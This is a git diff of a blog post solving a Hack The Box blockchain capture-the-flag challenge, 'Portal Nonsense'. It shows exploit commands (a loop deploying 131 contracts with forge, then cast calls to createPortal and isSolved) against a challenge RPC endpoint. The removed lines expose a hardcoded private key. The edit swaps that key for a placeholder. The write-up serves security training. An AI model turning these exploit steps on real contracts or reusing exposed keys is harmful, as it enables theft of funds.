@@ -1,7 +1,8 @@
 ---
-title: HTB Blockchain Challenge - Honor Among Thieves
+title: HTB Blockchain Challenge - Portal Nonsense
 date: {{ date }}
 cover   : "/img/htb3.jpeg"
+tags: Blockchain SmartContract Exploit
 ---
 Portal Nonsense
 ===
@@ -116,11 +117,11 @@ contract Delegate {
 * generate 130 
 ```python=
 for i in range(131):
-    ret = str(subprocess.check_output('forge create src/test.sol:test --rpc-url http://167.99.85.216:30676/rpc --private-key 0x2de3d450f2b9f28d5640560572511a56b1133ff1f39236fc40e51c6fb55e945c', shell=True))
+    ret = str(subprocess.check_output('forge create src/test.sol:test --rpc-url http://167.99.85.216:30676/rpc --private-key {{private key}}', shell=True))
     print(ret)
 
 
 ```
-* ` cast send --rpc-url http://167.99.85.216:30676/rpc --private-key 0x2de3d450f2b9f28d5640560572511a56b1133ff1f39236fc40e51c6fb55e945c  0xACef632826fb9d4EF70cB70640b5F56b7474B3a9 "createPortal(string)" "orcKingdom"`
+* ` cast send --rpc-url http://167.99.85.216:30676/rpc --private-key {{private key}}  0xACef632826fb9d4EF70cB70640b5F56b7474B3a9 "createPortal(string)" "orcKingdom"`
 
-* `cast call --rpc-url http://167.99.85.216:30676/rpc --private-key 0x2de3d450f2b9f28d5640560572511a56b1133ff1f39236fc40e51c6fb55e945c  0xfD730FDDbD5b98471b7a0fE78d2CB0Fd0E5454BA "isSolved()"` 
+* `cast call --rpc-url http://167.99.85.216:30676/rpc --private-key {{private key}}  0xfD730FDDbD5b98471b7a0fE78d2CB0Fd0E5454BA "isSolved()"` 
